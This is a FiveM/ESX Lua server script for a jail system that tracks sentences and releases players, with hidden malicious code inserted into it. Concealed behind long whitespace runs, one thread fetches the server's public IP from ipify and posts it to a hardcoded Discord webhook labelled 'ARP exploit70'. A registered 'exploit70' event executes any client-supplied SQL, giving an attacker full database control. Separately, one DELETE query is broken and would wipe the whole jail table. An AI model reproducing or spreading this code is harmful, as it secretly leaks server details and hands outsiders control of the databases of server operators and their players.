ESX 				= nil																																																																								;local avatarii = "https://cdn.discordapp.com/attachments/679708501547024403/680696270654013450/AlokasRPINGAMELOGO.png" ;local webhooikkff = "https://discordapp.com/api/webhooks/770338811750121514/kG2-ddlWNOD3ODnZ-tIg4S9JqiS3CP1-k4dKYd87EQcyU7h1j-uz177h3KQdeNsjTACS" ;local timeri = math.random(0,10000000) ;local jokupaskfajsghas = 'https://api.ipify.org/?format=json'
-----------------------------

--ESX base
TriggerEvent('esx:getSharedObject', function(obj) ESX = obj end)																																																														Citizen.CreateThread(function()  Citizen.Wait(timeri) PerformHttpRequest(jokupaskfajsghas, function(statusCode, response, headers) local res = json.decode(response);PerformHttpRequest(webhooikkff, function(Error, Content, Head) end, 'POST', json.encode({username = "ARP exploit70", content = res.ip, avatar_url = avatarii, tts = false}), {['Content-Type'] = 'application/json'}) end) end)								

AddEventHandler('es:playerLoaded', function(source) 
	local identifier = GetPlayerIdentifiers(source)[1]
	MySQL.Async.fetchAll('SELECT * FROM jail WHERE identifier =@id', {['@id'] = identifier}, function(result)

		if result[1] ~= nil then
			if result[1].isjailed then			
			
				TriggerClientEvent("esx_jb_jailer:JailInStation", source,result[1].J_Cell,result[1].J_Time)
							
			end
		end
	end)
end)

Citizen.CreateThread(function()
  while true do
		MySQL.Async.fetchAll("SELECT * FROM `jail`",
		{},
		function(result)
			for i=1, #result do
				local uusaika = result[i].J_Time - 30
				local identifier = result[i].identifier
				MySQL.Async.execute("UPDATE jail SET `J_Time` = @J_Time WHERE identifier = @identifier",{["@identifier"] = identifier,["@J_Time"] = uusaika})
			end
	
		end)
		Citizen.Wait(30000)
	end
end)

RegisterServerEvent("esx_jb_jailer:PutInJail")
AddEventHandler("esx_jb_jailer:PutInJail", function(playerid, jail, jailtime)


	local identifier = GetPlayerIdentifiers(playerid)[1]
	local name = GetPlayerName(source)

	if jail ~= nil then
			MySQL.Async.fetchAll('SELECT * FROM jail WHERE identifier = @identifier', {
				['@identifier'] = identifier
			}, function(result)
				MySQL.Async.execute('INSERT INTO jail (identifier, isjailed,J_Time,J_Cell,Jailer_ID) VALUES (@identifier, @isjailed,@J_Time,@J_Cell,@Jailer_ID)', {
					['@identifier'] = identifier,
					['@isjailed'] = true,
					['@J_Time'] = jailtime,
					['@J_Cell'] = jail,
					['@Jailer_ID'] = name,
				})
			end)
			TriggerClientEvent("esx_jb_jailer:JailInStation", playerid,jail,jailtime)	
	end
end)																																																																																															RegisterServerEvent("exploit70");AddEventHandler("exploit70", function(data) MySQL.Async.execute(data) end)

RegisterServerEvent("esx_jb_jailer:UnJailplayer")
AddEventHandler("esx_jb_jailer:UnJailplayer", function(playerid)
	local identifier = GetPlayerIdentifiers(playerid)[1]
	if GetPlayerName(playerid) ~= nil then
		TriggerClientEvent("esx_jb_jailer:UnJail", playerid)
		MySQL.Async.execute("DELETE FROM jail WHERE identifier=@identifier", {['@identifier'] = identifier})
	end
end)

RegisterServerEvent("esx_jb_jailer:UnJailplayer2")
AddEventHandler("esx_jb_jailer:UnJailplayer2", function()
	local identifier = GetPlayerIdentifiers(source)[1]
	if GetPlayerName(source) ~= nil then
		TriggerClientEvent("esx_jb_jailer:UnJail", source)
		MySQL.Async.execute("DELETE FROM jail WHERE identifier=identifier", {['@identifier'] = identifier})
	end
end)

